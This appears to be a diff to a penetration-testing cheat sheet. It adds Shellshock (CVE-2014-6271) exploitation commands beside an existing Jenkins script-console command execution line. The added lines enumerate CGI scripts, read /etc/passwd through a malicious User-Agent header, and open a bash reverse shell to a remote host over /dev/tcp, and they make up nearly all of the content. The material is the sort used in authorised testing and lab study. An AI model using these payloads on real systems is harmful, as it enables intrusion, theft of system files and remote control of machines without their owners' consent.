@@ -3492,6 +3492,15 @@ $ curl -s "http://<IP address>:8080/securityRealm/user/admin/descriptorByName/or
   --data-urlencode 'value=public class x { public x(){ "ping -c 1 <Attacker IP address>".execute() } }'
 ```
 
+- Shellshock - CVE-2014-6271
+
+```
+$ gobuster dir -u http://<IP address>/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
+$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
+$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://<IP address>/cgi-bin/access.cgi
+$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://<IP address>/cgi-bin/access.cgi
+```
+
 - Juicy Potato
 
 ```
